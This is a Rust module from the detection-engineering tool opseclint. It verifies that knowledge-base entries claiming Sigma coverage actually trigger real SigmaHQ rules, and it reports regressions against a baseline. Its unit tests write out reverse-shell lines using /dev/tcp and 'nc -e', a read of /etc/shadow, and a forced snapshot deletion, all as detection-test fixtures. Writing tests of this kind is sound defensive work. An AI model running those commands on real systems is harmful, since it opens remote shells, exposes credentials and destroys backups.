//! Detection verification. opseclint's knowledge base *claims* that each entry
//! is caught by a Sigma detection (`detections[].source == "Sigma"`). This
//! module proves those claims against a real ruleset: for every entry that
//! carries a Sigma claim, it synthesizes a representative command and checks
//! whether a genuine SigmaHQ rule for the entry's technique(s) would actually
//! *fire* on it.
//!
//! Unlike `--coverage-gaps` (which audits the *input* actions a user analyzes),
//! this audits the knowledge base itself, so it can run in CI as a regression
//! gate: a claimed detection that stops firing is a real quality regression.

use std::collections::{BTreeMap, BTreeSet};

use serde::{Deserialize, Serialize};

use opseclint_core::kb::Platform;
use opseclint_core::model::{KbEntry, KnowledgeBase};
use opseclint_core::parser::{self, Command};
use opseclint_core::sigma::SigmaIndex;
use opseclint_core::sigma_eval::{self, Outcome};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum Status {
    /// A real rule for the entry's technique(s) fires on its command. Claim holds.
    Verified,
    /// Rules exist for the technique(s) but none fire on the command. The KB
    /// claims a detection the live ruleset does not substantiate.
    Unverified,
    /// Rules exist but only evaluate to INDETERMINATE (need host fields opseclint
    /// cannot synthesize). Neither confirmed nor refuted.
    Indeterminate,
    /// No rule in the ruleset covers the entry's technique(s) at all.
    NoRule,
    /// Rules exist for the technique(s), but every one of them declares a
    /// logsource this analysis can never satisfy — a PowerShell script block, a
    /// file or registry event, a proxy log. Not an abstention: the question was
    /// never addressed to a command line. Reported apart from `Indeterminate`
    /// so that count keeps its meaning of "answerable with more data".
    NotApplicable,
    /// Delta-only: a previously-verified entry vanished from the current run
    /// (its entry or Sigma claim was removed). Never produced by classify.
    Removed,
}

impl Status {
    fn label(self) -> &'static str {
        match self {
            Status::Verified => "VERIFIED",
            Status::Unverified => "UNVERIFIED",
            Status::Indeterminate => "INDETERMINATE",
            Status::NoRule => "NO-RULE",
            Status::NotApplicable => "NOT-APPLICABLE",
            Status::Removed => "REMOVED",
        }
    }

    fn rank(self) -> u8 {
        match self {
            Status::Unverified => 0,
            Status::NoRule => 1,
            Status::NotApplicable => 1,
            Status::Indeterminate => 2,
            Status::Verified => 3,
            Status::Removed => 0,
        }
    }
}

fn is_zero(n: &usize) -> bool {
    *n == 0
}

fn is_false(b: &bool) -> bool {
    !*b
}

/// Why an entry came out `Indeterminate`, unioned over its candidate rules.
///
/// `Indeterminate` is one status but it has several distinct causes, and until
/// they are told apart the count says only "the evaluator abstained a lot" — not
/// whether that is fixable, and if so by what. The two actionable causes are
/// very different work: `modifiers` is evaluator features we could implement,
/// `missing_fields` is host telemetry the tool would have to be handed.
///
/// Causes are not mutually exclusive; one entry can report several.
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
pub struct IndeterminateCause {
    /// Modifier tokens the evaluator does not implement (`re`, `windash`, …).
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub modifiers: Vec<String>,
    /// Fields a rule keys on that a command line cannot supply.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub missing_fields: Vec<String>,
    /// Candidate rules that could not be lowered to detection logic at all.
    #[serde(default, skip_serializing_if = "is_zero")]
    pub unparsed_rules: usize,
    /// Candidate rules set aside because their logsource is a different event
    /// class. Never evaluated, so they contribute to no other cause here.
    #[serde(default, skip_serializing_if = "is_zero")]
    pub inapplicable_rules: usize,
    /// A rule asserted a field is absent (`field: null`). Abstaining is
    /// arguably correct, so this is reported apart from the fixable causes.
    #[serde(default, skip_serializing_if = "is_false")]
    pub null_value_match: bool,
    /// The entry has no representative line to evaluate against — a
    /// knowledge-base gap, not a rule-side one. Explicit rather than inferred
    /// from an otherwise-empty cause, so it survives other fields being set.
    #[serde(default, skip_serializing_if = "is_false")]
    pub no_representative: bool,
}

impl IndeterminateCause {
    pub fn is_empty(&self) -> bool {
        *self == Self::default()
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VerifyResult {
    pub id: String,
    pub description: String,
    pub techniques: Vec<String>,
    /// The rule name(s) the KB claims detect this action.
    pub claimed: Vec<String>,
    pub status: Status,
    /// Titles of the real rules that fire (when `Verified`).
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub firing: Vec<String>,
    /// Populated only for `Indeterminate`. Absent from older baselines, which
    /// still deserialize — `--diff` compares `status` by `id` and ignores this.
    #[serde(default, skip_serializing_if = "IndeterminateCause::is_empty")]
    pub because: IndeterminateCause,
}

/// A saveable verification run: platform, ruleset size, and per-entry results.
/// Serialized by `--verify-detections --json`, read back by `--diff`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VerifyReport {
    pub platform: String,
    pub rules_indexed: usize,
    pub results: Vec<VerifyResult>,
}

impl VerifyReport {
    pub fn count(&self, status: Status) -> usize {
        self.results.iter().filter(|r| r.status == status).count()
    }
}

/// True when the entry carries at least one Sigma detection claim.
fn claims_sigma(entry: &KbEntry) -> bool {
    entry
        .detections
        .iter()
        .any(|d| d.source.eq_ignore_ascii_case("sigma"))
}

/// The Sigma rule name(s) the entry claims.
fn claimed_rules(entry: &KbEntry) -> Vec<String> {
    entry
        .detections
        .iter()
        .filter(|d| d.source.eq_ignore_ascii_case("sigma"))
        .map(|d| d.rule.clone())
        .filter(|r| !r.is_empty())
        .collect()
}

/// Build a representative command for a KB entry: a synthetic command line the
/// entry matches (its `example`, or one derived from the matcher's literals), so
/// the synthesized event carries what a real rule would look for.
fn representative_command(entry: &KbEntry) -> Option<Command> {
    let line = entry.representative_line()?;
    parser::parse_line(&line).into_iter().next()
}

/// Classify a single entry against the ruleset. Mirrors the fire/indeterminate/
/// gap logic used by coverage analysis so the two stay consistent.
fn classify(
    entry: &KbEntry,
    index: &SigmaIndex,
    platform: Platform,
) -> (Status, Vec<String>, IndeterminateCause) {
    let tids: Vec<String> = entry.techniques.iter().map(|t| t.id.clone()).collect();
    // The full candidate set, not the display-capped one: a claim is only
    // honestly contradicted once every rule for its technique has been asked.
    let all_candidates = index.candidate_rules(&tids);
    if all_candidates.is_empty() {
        return (Status::NoRule, Vec::new(), IndeterminateCause::default());
    }
    // Set aside rules whose logsource is a different event class. They cannot
    // fire on a synthesized process-execution event, so evaluating them would
    // only manufacture abstentions — or worse, a spurious `Fires` for a
    // file/registry rule that happens to key on `CommandLine`.
    let (candidates, inapplicable): (Vec<_>, Vec<_>) = all_candidates
        .into_iter()
        .partition(|r| r.applies_to_process_execution());
    if candidates.is_empty() {
        return (
            Status::NotApplicable,
            Vec::new(),
            IndeterminateCause {
                inapplicable_rules: inapplicable.len(),
                ..Default::default()
            },
        );
    }
    let Some(cmd) = representative_command(entry) else {
        // No representative line to evaluate against — a knowledge-base gap,
        // not a rule-side cause. Rules were still set aside on the way here, so
        // report that too rather than dropping it.
        return (
            Status::Indeterminate,
            Vec::new(),
            IndeterminateCause {
                no_representative: true,
                inapplicable_rules: inapplicable.len(),
                ..Default::default()
            },
        );
    };

    let mut firing = Vec::new();
    let mut any_indet = false;
    let mut mods: BTreeSet<String> = BTreeSet::new();
    let mut fields: BTreeSet<String> = BTreeSet::new();
    let mut cause = IndeterminateCause::default();
    for c in &candidates {
        match &c.rule {
            Some(dr) => {
                let v = sigma_eval::evaluate(dr, &cmd, platform);
                match v.outcome {
                    Outcome::Fires => firing.push(c.title.clone()),
                    Outcome::Indeterminate => {
                        any_indet = true;
                        mods.extend(v.blocking_modifiers);
                        fields.extend(v.missing_fields);
                        cause.null_value_match |= v.null_value_match;
                    }
                    Outcome::NoFire => {}
                }
            }
            None => {
                // The rule could not be lowered to logic at all — a parser gap,
                // not an evaluation gap. Counted apart from the rest.
                any_indet = true;
                cause.unparsed_rules += 1;
            }
        }
    }

    if !firing.is_empty() {
        (Status::Verified, firing, IndeterminateCause::default())
    } else if any_indet {
        cause.modifiers = mods.into_iter().collect();
        cause.missing_fields = fields.into_iter().collect();
        cause.inapplicable_rules = inapplicable.len();
        (Status::Indeterminate, Vec::new(), cause)
    } else {
        (
            Status::Unverified,
            Vec::new(),
            IndeterminateCause::default(),
        )
    }
}

/// Verify every entry that carries a Sigma detection claim.
pub fn verify(kb: &KnowledgeBase, index: &SigmaIndex, platform: Platform) -> VerifyReport {
    let mut results: Vec<VerifyResult> = kb
        .entries
        .iter()
        .filter(|e| claims_sigma(e))
        .map(|e| {
            let (status, firing, because) = classify(e, index, platform);
            VerifyResult {
                id: e.id.clone(),
                description: e.description.clone(),
                techniques: e.techniques.iter().map(|t| t.id.clone()).collect(),
                claimed: claimed_rules(e),
                status,
                firing,
                because,
            }
        })
        .collect();
    // Worst status first, then by id for a stable ordering.
    results.sort_by(|a, b| a.status.rank().cmp(&b.status.rank()).then(a.id.cmp(&b.id)));
    VerifyReport {
        platform: platform.sigma_product().to_string(),
        rules_indexed: index.rules_indexed,
        results,
    }
}

/// Rank a histogram by count, then name, and render the top few as
/// `name N, name N, …` with a tail marker when it is truncated.
fn top_n(hist: &BTreeMap<String, usize>, n: usize) -> String {
    let mut v: Vec<(&String, &usize)> = hist.iter().collect();
    v.sort_by(|a, b| b.1.cmp(a.1).then(a.0.cmp(b.0)));
    let shown: Vec<String> = v.iter().take(n).map(|(k, c)| format!("{k} {c}")).collect();
    let mut s = shown.join(", ");
    if v.len() > n {
        s.push_str(&format!(", +{} more", v.len() - n));
    }
    s
}

/// `(label, entries affected, detail)` per cause, worst first. Counts are of
/// *entries*, and overlap: one entry blocked by both a modifier and a missing
/// field is counted in both rows.
fn summarize_causes(report: &VerifyReport) -> Vec<(&'static str, usize, String)> {
    let mut by_mod: BTreeMap<String, usize> = BTreeMap::new();
    let mut by_field: BTreeMap<String, usize> = BTreeMap::new();
    let (mut n_mods, mut n_fields, mut n_unparsed, mut n_null, mut n_none) = (0, 0, 0, 0, 0);
    let mut n_inapp = 0;

    for r in report
        .results
        .iter()
        .filter(|r| r.status == Status::Indeterminate)
    {
        let b = &r.because;
        if !b.modifiers.is_empty() {
            n_mods += 1;
            for m in &b.modifiers {
                *by_mod.entry(m.clone()).or_default() += 1;
            }
        }
        if !b.missing_fields.is_empty() {
            n_fields += 1;
            for f in &b.missing_fields {
                *by_field.entry(f.clone()).or_default() += 1;
            }
        }
        if b.unparsed_rules > 0 {
            n_unparsed += 1;
        }
        if b.inapplicable_rules > 0 {
            n_inapp += 1;
        }
        if b.null_value_match {
            n_null += 1;
        }
        if b.no_representative {
            n_none += 1;
        }
    }

    let mut rows: Vec<(&'static str, usize, String)> = Vec::new();
    if n_mods > 0 {
        rows.push(("modifiers", n_mods, top_n(&by_mod, 5)));
    }
    if n_fields > 0 {
        rows.push(("missing fields", n_fields, top_n(&by_field, 5)));
    }
    if n_unparsed > 0 {
        rows.push(("unparsed rules", n_unparsed, String::new()));
    }
    if n_inapp > 0 {
        rows.push((
            "other logsource",
            n_inapp,
            "candidate rules set aside, not counted above".into(),
        ));
    }
    if n_null > 0 {
        rows.push((
            "field-absent",
            n_null,
            "rule asserts a field is null".into(),
        ));
    }
    if n_none > 0 {
        rows.push((
            "no representative",
            n_none,
            "entry has no line to evaluate".into(),
        ));
    }
    rows.sort_by_key(|r| std::cmp::Reverse(r.1));
    rows
}

pub fn render_json(report: &VerifyReport) -> String {
    serde_json::to_string_pretty(report).unwrap_or_else(|_| "{}".to_string())
}

/// Human-readable summary. `color` toggles ANSI styling.
pub fn render(report: &VerifyReport, color: bool) -> String {
    use crate::theme;
    let c = |code: &'static str| -> &'static str { if color { code } else { "" } };
    let reset = c(theme::RESET);

    let verified = report.count(Status::Verified);
    let unverified = report.count(Status::Unverified);
    let indet = report.count(Status::Indeterminate);
    let norule = report.count(Status::NoRule);
    let napp = report.count(Status::NotApplicable);
    let total = report.results.len();

    let mut out = String::new();
    out.push_str(&format!(
        "{}opseclint — detection verification ({}, {} rules indexed){}\n",
        c(theme::BOLD),
        report.platform,
        report.rules_indexed,
        reset
    ));
    out.push_str(&format!(
        "  {}{} verified{}  ·  {}{} unverified{}  ·  {} indeterminate  ·  {} no-rule  ·  {} n/a  ({} claimed)\n",
        c(theme::GREEN),
        verified,
        reset,
        c(theme::RED),
        unverified,
        reset,
        indet,
        norule,
        napp,
        total,
    ));

    // Break the indeterminate bucket down by cause. Without this the count says
    // only "the evaluator abstained a lot"; with it, it says what to go fix and
    // roughly what that would buy.
    if indet > 0 {
        let causes = summarize_causes(report);
        if !causes.is_empty() {
            out.push_str(&format!(
                "\n{}why indeterminate{} ({} entries; an entry can have more than one cause)\n",
                c(theme::BOLD),
                reset,
                indet,
            ));
            for (label, count, detail) in causes {
                out.push_str(&format!(
                    "  {:<16} {:>4}{}\n",
                    label,
                    count,
                    if detail.is_empty() {
                        String::new()
                    } else {
                        format!("  {}{}{}", c(theme::COMMENT), detail, reset)
                    },
                ));
            }
        }
    }

    // Only the actionable buckets get listed: unverified (contradicted claims)
    // and no-rule (unbacked claims). Verified/indeterminate are summarized above.
    let mut listed = false;
    for r in report
        .results
        .iter()
        .filter(|r| matches!(r.status, Status::Unverified | Status::NoRule))
    {
        if !listed {
            out.push('\n');
            listed = true;
        }
        let (mark, col) = match r.status {
            Status::Unverified => ("✗", c(theme::RED)),
            _ => ("·", c(theme::COMMENT)),
        };
        out.push_str(&format!(
            "  {col}{mark} {label:<11}{reset} {id}  [{tids}]\n      {desc}\n",
            label = r.status.label(),
            id = r.id,
            tids = r.techniques.join(", "),
            desc = r.description,
        ));
    }
    out
}

// --- baseline diff (regression gate) --------------------------------------

#[derive(Debug, Clone, Serialize)]
pub struct StatusChange {
    pub id: String,
    pub description: String,
    pub from: Status,
    pub to: Status,
}

#[derive(Debug, Clone, Serialize, Default)]
pub struct VerifyDelta {
    /// Entries that were Verified in the baseline but no longer are.
    pub regressions: Vec<StatusChange>,
    /// Entries that became Verified (were not before).
    pub improvements: Vec<StatusChange>,
    pub baseline_verified: usize,
    pub current_verified: usize,
}

impl VerifyDelta {
    pub fn has_regressed(&self) -> bool {
        !self.regressions.is_empty()
    }

    pub fn is_empty(&self) -> bool {
        self.regressions.is_empty() && self.improvements.is_empty()
    }
}

fn by_id(report: &VerifyReport) -> BTreeMap<&str, &VerifyResult> {
    report.results.iter().map(|r| (r.id.as_str(), r)).collect()
}

pub fn compute_delta(baseline: &VerifyReport, current: &VerifyReport) -> VerifyDelta {
    let base = by_id(baseline);
    let curr = by_id(current);
    let mut delta = VerifyDelta {
        baseline_verified: baseline.count(Status::Verified),
        current_verified: current.count(Status::Verified),
        ..Default::default()
    };
    for (id, cr) in &curr {
        let Some(br) = base.get(id) else { continue };
        if br.status == Status::Verified && cr.status != Status::Verified {
            delta.regressions.push(StatusChange {
                id: cr.id.clone(),
                description: cr.description.clone(),
                from: br.status,
                to: cr.status,
            });
        } else if br.status != Status::Verified && cr.status == Status::Verified {
            delta.improvements.push(StatusChange {
                id: cr.id.clone(),
                description: cr.description.clone(),
                from: br.status,
                to: cr.status,
            });
        }
    }
    // A previously-verified entry that vanished from the current run is also a
    // regression: the claim is no longer being proven at all, so the gate must
    // not pass just because the id disappeared.
    for (id, br) in &base {
        if br.status == Status::Verified && !curr.contains_key(id) {
            delta.regressions.push(StatusChange {
                id: br.id.clone(),
                description: br.description.clone(),
                from: Status::Verified,
                to: Status::Removed,
            });
        }
    }
    delta.regressions.sort_by(|a, b| a.id.cmp(&b.id));
    delta.improvements.sort_by(|a, b| a.id.cmp(&b.id));
    delta
}

pub fn render_delta(delta: &VerifyDelta, color: bool) -> String {
    use crate::theme;
    let c = |code: &'static str| -> &'static str { if color { code } else { "" } };
    let reset = c(theme::RESET);
    let mut out = String::new();
    out.push_str(&format!(
        "detection verification vs baseline: {} → {} verified\n",
        delta.baseline_verified, delta.current_verified
    ));
    if delta.is_empty() {
        out.push_str("  no change\n");
        return out;
    }
    for r in &delta.regressions {
        out.push_str(&format!(
            "  {}✗ REGRESSED{} {} ({} → {})\n      {}\n",
            c(theme::RED),
            reset,
            r.id,
            r.from.label(),
            r.to.label(),
            r.description,
        ));
    }
    for r in &delta.improvements {
        out.push_str(&format!(
            "  {}✓ VERIFIED{}  {} ({} → {})\n",
            c(theme::GREEN),
            reset,
            r.id,
            r.from.label(),
            r.to.label(),
        ));
    }
    out
}

pub fn render_delta_json(delta: &VerifyDelta) -> String {
    serde_json::to_string_pretty(delta).unwrap_or_else(|_| "{}".to_string())
}

#[cfg(test)]
mod tests {
    use super::*;
    use opseclint_core::kb;
    use opseclint_core::matcher::{LinePred, Matcher, ProgramMatch};
    use opseclint_core::model::{Detection, Technique};
    use std::path::PathBuf;

    fn index() -> SigmaIndex {
        let dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../tests/fixtures/sigma");
        SigmaIndex::load_dir(&dir, "linux").expect("index loads")
    }

    /// Build a KB entry that claims a Sigma detection, keyed either by an exact
    /// program or by a raw line substring.
    fn entry(id: &str, command: Option<&str>, raw: Option<&str>, tech: &str) -> KbEntry {
        let matcher = Matcher {
            program: command.map(|c| ProgramMatch::Exact(c.to_string())),
            args: None,
            line: raw.map(|r| LinePred::Contains(r.to_string())),
            event: None,
        };
        KbEntry {
            id: id.into(),
            matcher,
            example: None,
            description: format!("{id} description"),
            techniques: vec![Technique {
                id: tech.into(),
                name: tech.into(),
            }],
            telemetry: vec![],
            detections: vec![Detection {
                source: "Sigma".into(),
                rule: format!("{id} rule"),
                confidence: "medium".into(),
                verdict: None,
            }],
            noise: 50,
        }
    }

    fn kb_of(entries: Vec<KbEntry>) -> KnowledgeBase {
        KnowledgeBase {
            platform: "linux".into(),
            note: String::new(),
            entries,
        }
    }

    fn result_for<'a>(report: &'a VerifyReport, id: &str) -> &'a VerifyResult {
        report
            .results
            .iter()
            .find(|r| r.id == id)
            .unwrap_or_else(|| panic!("no result for {id}"))
    }

    #[test]
    fn verified_when_a_real_rule_fires() {
        // The /dev/tcp reverse-shell fixture (CommandLine contains /dev/tcp/)
        // fires on a realistic reverse-shell command → claim verified.
        let kb = kb_of(vec![entry(
            "revsh",
            None,
            Some("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
            "T1059.004",
        )]);
        let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
        assert_eq!(result_for(&report, "revsh").status, Status::Verified);
        assert!(!result_for(&report, "revsh").firing.is_empty());
    }

    #[test]
    fn unverified_when_rule_exists_but_does_not_fire() {
        // Same technique (T1059.004) as the /dev/tcp rule, but a command the rule
        // cannot match → the claim is contradicted.
        let kb = kb_of(vec![entry(
            "nc-revsh",
            None,
            Some("nc -e /bin/sh 10.0.0.1 4444"),
            "T1059.004",
        )]);
        let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
        assert_eq!(result_for(&report, "nc-revsh").status, Status::Unverified);
    }

    /// The display cap must not reach the verdict. Six same-level rules share
    /// T1490 in the fixtures, and only the sixth — ordered last on title —
    /// fires. Drawing candidates from the capped list would report this claim
    /// as contradicted while the rule proving it sat one slot out of view.
    #[test]
    fn a_rule_past_the_display_cap_still_verifies_the_claim() {
        let kb = kb_of(vec![entry(
            "lv-remove",
            None,
            Some("lvremove --force /dev/vg0/snap"),
            "T1490",
        )]);
        let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
        let r = result_for(&report, "lv-remove");
        assert_eq!(r.status, Status::Verified);
        assert_eq!(r.firing, vec!["Zebra Snapshot Deletion".to_string()]);
    }

    /// The distinction the `NotApplicable` status exists to draw. Both rules
    /// key on a field a command line cannot supply, but only one of them was
    /// ever asking about a process execution.
    #[test]
    fn a_rule_for_another_event_class_is_not_applicable_not_indeterminate() {
        // The shadow fixture is `category: file_event`. No amount of extra
        // process telemetry would let it fire on a command, so calling it
        // indeterminate overstates what we are abstaining from.
        let kb = kb_of(vec![entry(
            "shadow",
            None,
            Some("cat /etc/shadow"),
            "T1003.008",
        )]);
        let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
        let r = result_for(&report, "shadow");
        assert_eq!(r.status, Status::NotApplicable);
        assert_eq!(r.because.inapplicable_rules, 1);
    }

    #[test]
    fn a_process_creation_rule_needing_a_field_stays_indeterminate() {
        // The sshd fixture IS `category: process_creation`; it just needs
        // ParentImage, which real telemetry could supply. That is a genuine
        // abstention and must not be swept into "not applicable".
        let kb = kb_of(vec![entry("whoami", None, Some("whoami"), "T1552.001")]);
        let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
        let r = result_for(&report, "whoami");
        assert_eq!(r.status, Status::Indeterminate);
        assert_eq!(r.because.missing_fields, vec!["ParentImage".to_string()]);
        assert_eq!(r.because.inapplicable_rules, 0);
    }

    #[test]
    fn no_rule_when_technique_absent_from_ruleset() {
        // T1033 has no rule in the tiny fixture set.
        let kb = kb_of(vec![entry("whoami", Some("whoami"), None, "T1033")]);
        let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
        assert_eq!(result_for(&report, "whoami").status, Status::NoRule);
    }

    #[test]
    fn only_entries_with_a_sigma_claim_are_verified() {
        let mut with_claim = entry("claimed", Some("whoami"), None, "T1033");
        let mut no_claim = entry("unclaimed", Some("ls"), None, "T1083");
        no_claim.detections.clear(); // no Sigma claim → skipped
        with_claim.detections.push(Detection {
            source: "Custom".into(),
            rule: "internal".into(),
            confidence: "low".into(),
            verdict: None,
        });
        let kb = kb_of(vec![with_claim, no_claim]);
        let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
        assert_eq!(report.results.len(), 1);
        assert_eq!(report.results[0].id, "claimed");
        assert!(report.results.iter().all(|r| !r.claimed.is_empty()));
    }

    #[test]
    fn real_kb_verifies_without_panicking() {
        // Smoke test against the shipped KB + fixtures: every claiming entry is
        // classified, results carry claimed rule names, counts add up.
        let kb = kb::load(kb::Platform::LinuxAuditd).unwrap();
        let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
        let claimed = kb.entries.iter().filter(|e| claims_sigma(e)).count();
        assert_eq!(report.results.len(), claimed);
        assert!(report.results.iter().all(|r| !r.claimed.is_empty()));
        let sum = report.count(Status::Verified)
            + report.count(Status::Unverified)
            + report.count(Status::Indeterminate)
            + report.count(Status::NoRule)
            + report.count(Status::NotApplicable);
        assert_eq!(sum, report.results.len());
    }

    /// The cause breakdown drives what someone works on next, so it has to be
    /// stable run to run. `sort_by_key` is a *stable* sort (`sort_unstable_by`
    /// is the reordering one), and rows are pushed in a fixed sequence, so ties
    /// keep that sequence rather than varying. Asserted rather than assumed.
    #[test]
    fn cause_breakdown_is_ranked_and_deterministic_on_ties() {
        let mk = |id: &str, because: IndeterminateCause| VerifyResult {
            id: id.into(),
            description: format!("{id} desc"),
            techniques: vec!["T1000".into()],
            claimed: vec!["some rule".into()],
            status: Status::Indeterminate,
            firing: vec![],
            because,
        };
        let modifier_only = IndeterminateCause {
            modifiers: vec!["windash".into()],
            ..Default::default()
        };
        let field_only = IndeterminateCause {
            missing_fields: vec!["ParentImage".into()],
            ..Default::default()
        };
        let report = VerifyReport {
            platform: "windows".into(),
            rules_indexed: 10,
            // One entry per cause: a deliberate tie at 1 each.
            results: vec![mk("a", modifier_only), mk("b", field_only)],
        };

        let first = summarize_causes(&report);
        assert_eq!(
            first.iter().map(|r| (r.0, r.1)).collect::<Vec<_>>(),
            vec![("modifiers", 1), ("missing fields", 1)],
            "tied rows keep their push order"
        );
        // Same input must give the same answer every time.
        for _ in 0..8 {
            assert_eq!(summarize_causes(&report), first);
        }

        // And a clear winner must actually outrank a tie.
        let mut skewed = report.clone();
        skewed.results.push(mk(
            "c",
            IndeterminateCause {
                missing_fields: vec!["ParentImage".into()],
                ..Default::default()
            },
        ));
        let ranked = summarize_causes(&skewed);
        assert_eq!(ranked[0].0, "missing fields");
        assert_eq!(ranked[0].1, 2);
    }

    #[test]
    fn delta_flags_regression_and_improvement() {
        let mk = |id: &str, status: Status| VerifyResult {
            id: id.into(),
            description: format!("{id} desc"),
            techniques: vec!["T1000".into()],
            claimed: vec!["some rule".into()],
            status,
            firing: vec![],
            because: IndeterminateCause::default(),
        };
        let baseline = VerifyReport {
            platform: "linux".into(),
            rules_indexed: 3,
            results: vec![
                mk("a", Status::Verified),   // will regress
                mk("b", Status::Unverified), // will improve
                mk("c", Status::Verified),   // unchanged
            ],
        };
        let current = VerifyReport {
            platform: "linux".into(),
            rules_indexed: 3,
            results: vec![
                mk("a", Status::Unverified),
                mk("b", Status::Verified),
                mk("c", Status::Verified),
            ],
        };
        let delta = compute_delta(&baseline, &current);
        assert!(delta.has_regressed());
        assert_eq!(delta.regressions.len(), 1);
        assert_eq!(delta.regressions[0].id, "a");
        assert_eq!(delta.improvements.len(), 1);
        assert_eq!(delta.improvements[0].id, "b");
    }

    #[test]
    fn delta_flags_vanished_verified_entry() {
        // A previously-verified entry missing from the current run must count as
        // a regression, not silently pass the gate.
        let mk = |id: &str, status: Status| VerifyResult {
            id: id.into(),
            description: format!("{id} desc"),
            techniques: vec!["T1000".into()],
            claimed: vec!["some rule".into()],
            status,
            firing: vec![],
            because: IndeterminateCause::default(),
        };
        let baseline = VerifyReport {
            platform: "linux".into(),
            rules_indexed: 1,
            results: vec![mk("gone", Status::Verified), mk("stay", Status::Verified)],
        };
        let current = VerifyReport {
            platform: "linux".into(),
            rules_indexed: 1,
            results: vec![mk("stay", Status::Verified)],
        };
        let delta = compute_delta(&baseline, &current);
        assert!(delta.has_regressed());
        assert_eq!(delta.regressions.len(), 1);
        assert_eq!(delta.regressions[0].id, "gone");
        assert_eq!(delta.regressions[0].to, Status::Removed);
    }
}
